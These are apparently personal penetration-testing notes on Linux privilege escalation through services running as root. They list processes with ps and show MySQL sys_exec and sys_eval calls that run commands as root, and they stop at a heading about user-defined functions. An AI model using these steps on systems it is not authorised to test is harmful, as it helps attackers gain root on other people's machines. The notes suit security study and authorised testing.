# Programs Running as Root

## Programs Running as Root

* the idea here is that if specific service is running as root and you can make that service execute commands as root
* look for a webserver, database or anything else like that
* a typical example of this is mysql, example is below

## Check Which Processes are Running

### Metasploit

```bash
ps
```

### Linux

```bash
ps aux
```

## MySQL

* if you find that MySQL is running as root and you have username and password to log in to the database
* you can issue the following commands

```bash
select sys_exec('whoami');
select sys_eval('whoami');
```

### If Neither of Those Work, Use a User Defined Function
